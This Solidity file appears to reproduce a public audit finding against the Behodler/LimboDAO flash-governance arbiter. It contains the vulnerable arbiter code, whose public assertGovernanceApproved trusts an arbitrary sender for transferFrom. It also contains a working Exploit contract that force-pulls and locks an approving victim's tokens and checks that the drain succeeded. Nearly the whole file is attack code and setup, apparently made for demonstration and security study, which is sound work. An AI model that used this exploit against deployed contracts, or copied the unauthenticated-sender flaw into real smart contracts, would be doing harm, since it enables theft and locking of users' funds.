// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

// Real-source reconstruction of AuditVault #42453 (Behodler / LimboDAO, Code4rena
// 2022-01). The FlashGovernanceArbiter + Governable code below is the ACTUAL audited
// source from github.com/code-423n4/2022-01-behodler (contracts/DAO/), inlined into a
// single, forge-std-free file so the in-browser EVM can deploy and execute it.
// The only edits are dropping the unused `hardhat/console.sol` debug import and
// inlining the OZ IERC20 + the LimboDAO/ProposalFactory/Burnable facade interfaces.

// ---------------------------------------------------------------------------
// Minimal ERC20 standing in for EYE, the opaque flash-governance deposit token.
// The arbiter treats it purely through the IERC20 interface.
// ---------------------------------------------------------------------------
interface IERC20 {
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
}

contract EYE {
    string public name = "Behodler EYE";
    string public symbol = "EYE";
    uint8 public decimals = 18;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 a = allowance[from][msg.sender];
        require(a >= amount, "EYE: allowance");
        if (a != type(uint256).max) allowance[from][msg.sender] = a - amount;
        _transfer(from, to, amount);
        return true;
    }

    function _transfer(address from, address to, uint256 amount) internal {
        require(balanceOf[from] >= amount, "EYE: balance");
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
    }
}

// ---------------------------------------------------------------------------
// Behodler facade interfaces referenced by the real Governable base contract.
// ---------------------------------------------------------------------------
abstract contract LimboDAOLike {
    function successfulProposal(address proposal) public view virtual returns (bool);
    function getFlashGoverner() external view virtual returns (address);
    function proposalConfig() public view virtual returns (uint, uint, address);
}

abstract contract FlashGovernanceArbiterLike {
    function assertGovernanceApproved(address sender, address target, bool emergency) public virtual;
    function setEnforcement(bool enforce) public virtual;
}

abstract contract ProposalFactoryLike {
    function soulUpdateProposal() public view virtual returns (address);
}

abstract contract Burnable {
    function burn(uint256 amount) public virtual;
}

// ---------------------------------------------------------------------------
// REAL Behodler Governable base (contracts/DAO/Governable.sol), verbatim logic.
// ---------------------------------------------------------------------------
abstract contract Governable {
    FlashGovernanceArbiterLike internal flashGoverner;

    bool public configured;
    address public DAO;

    function endConfiguration() public {
        configured = true;
    }

    modifier onlySuccessfulProposal() {
        assertSuccessfulProposal(msg.sender);
        _;
    }

    function assertSuccessfulProposal(address sender) internal view {
        require(!configured || LimboDAOLike(DAO).successfulProposal(sender), "EJ");
    }

    constructor(address dao) {
        setDAO(dao);
    }

    function setDAO(address dao) public {
        require(DAO == address(0) || msg.sender == DAO || !configured, "EK");
        DAO = dao;
        flashGoverner = FlashGovernanceArbiterLike(LimboDAOLike(dao).getFlashGoverner());
    }
}

// ---------------------------------------------------------------------------
// REAL Behodler FlashGovernanceArbiter (contracts/DAO/FlashGovernanceArbiter.sol),
// verbatim vulnerable logic. `assertGovernanceApproved` is `public` with NO caller
// authentication and trusts the arbitrary `sender` argument as the `transferFrom`
// source — this is AuditVault #42453 (H-01).
// ---------------------------------------------------------------------------
contract FlashGovernanceArbiter is Governable {
    event flashDecision(address actor, address deposit_asset, uint256 amount, address target);

    mapping(address => bool) enforceLimitsActive;

    constructor(address dao) Governable(dao) {}

    struct FlashGovernanceConfig {
        address asset;
        uint256 amount;
        uint256 unlockTime;
        bool assetBurnable;
    }

    struct SecurityParameters {
        uint8 maxGovernanceChangePerEpoch;
        uint256 epochSize;
        uint256 lastFlashGovernanceAct;
        uint8 changeTolerance;
    }

    FlashGovernanceConfig public flashGovernanceConfig;
    SecurityParameters public security;

    mapping(address => mapping(address => FlashGovernanceConfig)) public pendingFlashDecision;

    function assertGovernanceApproved(
        address sender,
        address target,
        bool emergency
    ) public {
        if (
            IERC20(flashGovernanceConfig.asset).transferFrom(sender, address(this), flashGovernanceConfig.amount) &&
            pendingFlashDecision[target][sender].unlockTime < block.timestamp
        ) {
            require(
                emergency || (block.timestamp - security.lastFlashGovernanceAct > security.epochSize),
                "Limbo: flash governance disabled for rest of epoch"
            );
            pendingFlashDecision[target][sender] = flashGovernanceConfig;
            pendingFlashDecision[target][sender].unlockTime += block.timestamp;

            security.lastFlashGovernanceAct = block.timestamp;
            emit flashDecision(sender, flashGovernanceConfig.asset, flashGovernanceConfig.amount, target);
        } else {
            revert("LIMBO: governance decision rejected.");
        }
    }

    function configureFlashGovernance(
        address asset,
        uint256 amount,
        uint256 unlockTime,
        bool assetBurnable
    ) public virtual onlySuccessfulProposal {
        flashGovernanceConfig.asset = asset;
        flashGovernanceConfig.amount = amount;
        flashGovernanceConfig.unlockTime = unlockTime;
        flashGovernanceConfig.assetBurnable = assetBurnable;
    }

    function burnFlashGovernanceAsset(
        address targetContract,
        address user,
        address asset,
        uint256 amount
    ) public virtual onlySuccessfulProposal {
        if (pendingFlashDecision[targetContract][user].assetBurnable) {
            Burnable(asset).burn(amount);
        }
        pendingFlashDecision[targetContract][user] = flashGovernanceConfig;
    }

    function withdrawGovernanceAsset(address targetContract, address asset) public virtual {
        require(
            pendingFlashDecision[targetContract][msg.sender].asset == asset &&
                pendingFlashDecision[targetContract][msg.sender].amount > 0 &&
                pendingFlashDecision[targetContract][msg.sender].unlockTime < block.timestamp,
            "Limbo: Flashgovernance decision pending."
        );
        IERC20(pendingFlashDecision[targetContract][msg.sender].asset).transfer(
            msg.sender,
            pendingFlashDecision[targetContract][msg.sender].amount
        );
        delete pendingFlashDecision[targetContract][msg.sender];
    }

    function setEnforcement(bool enforce) public {
        enforceLimitsActive[msg.sender] = enforce;
    }
}

// ---------------------------------------------------------------------------
// Minimal LimboDAO stand-in. Only `getFlashGoverner()` is touched (once, inside
// the arbiter constructor). It is NOT part of the exploit path.
// ---------------------------------------------------------------------------
contract DaoStub is LimboDAOLike {
    function successfulProposal(address) public pure override returns (bool) {
        return false;
    }

    function getFlashGoverner() external pure override returns (address) {
        return address(0);
    }

    function proposalConfig() public pure override returns (uint, uint, address) {
        return (0, 0, address(0));
    }
}

// ---------------------------------------------------------------------------
// Honest victim (Alice): holds EYE and — as flash governance legitimately
// requires — approves the arbiter to pull the deposit amount. This is the ONLY
// precondition the attack needs.
// ---------------------------------------------------------------------------
contract Victim {
    constructor(EYE eye, address arbiter, uint256 amount) {
        eye.mint(address(this), amount);
        eye.approve(arbiter, type(uint256).max);
    }

    function withdraw(FlashGovernanceArbiter arbiter, address target, address asset) external {
        arbiter.withdrawGovernanceAsset(target, asset);
    }
}

// ---------------------------------------------------------------------------
// Exploit: the unauthorized third party (Bob). It never had any allowance of its
// own, yet by passing the victim as `sender` it force-pulls and locks the
// victim's approved EYE.
// ---------------------------------------------------------------------------
contract Exploit {
    EYE public eye;
    DaoStub public dao;
    FlashGovernanceArbiter public arbiter;
    Victim public victim;

    address public constant TARGET = address(0xCAFE);
    uint256 public constant DEPOSIT = 100 ether;

    uint256 public victimBalanceAfter;
    uint256 public arbiterBalanceAfter;
    uint256 public lockedUntil;

    constructor() {
        // Protocol setup phase (configured == false): deploy the arbiter and
        // register EYE as the flash-governance deposit asset.
        eye = new EYE();                                    // CREATE nonce 1
        dao = new DaoStub();                                // CREATE nonce 2
        arbiter = new FlashGovernanceArbiter(address(dao)); // CREATE nonce 3
        arbiter.configureFlashGovernance(address(eye), DEPOSIT, 1 days, false);

        // Alice approves the arbiter to pull her deposit (the intended flow).
        victim = new Victim(eye, address(arbiter), DEPOSIT); // CREATE nonce 4
    }

    function run() external {
        // Sanity: before the attack the victim holds all her EYE and nothing is locked.
        require(eye.balanceOf(address(victim)) == DEPOSIT, "victim not funded");
        require(eye.balanceOf(address(arbiter)) == 0, "arbiter pre-funded");

        // Bob (this contract) was never authorized and holds no EYE. He calls the
        // unguarded assertGovernanceApproved with the VICTIM as `sender`.
        arbiter.assertGovernanceApproved(address(victim), TARGET, true);

        // Harm: the victim's EYE was force-moved into the arbiter and time-locked.
        victimBalanceAfter = eye.balanceOf(address(victim));
        arbiterBalanceAfter = eye.balanceOf(address(arbiter));
        ( , uint256 amount, uint256 unlockTime, ) = arbiter.pendingFlashDecision(TARGET, address(victim));
        lockedUntil = unlockTime;

        require(victimBalanceAfter == 0, "victim not drained");
        require(arbiterBalanceAfter == DEPOSIT, "deposit not captured");
        require(amount == DEPOSIT, "no pending decision recorded");
        require(unlockTime > block.timestamp, "funds not locked");
    }
}
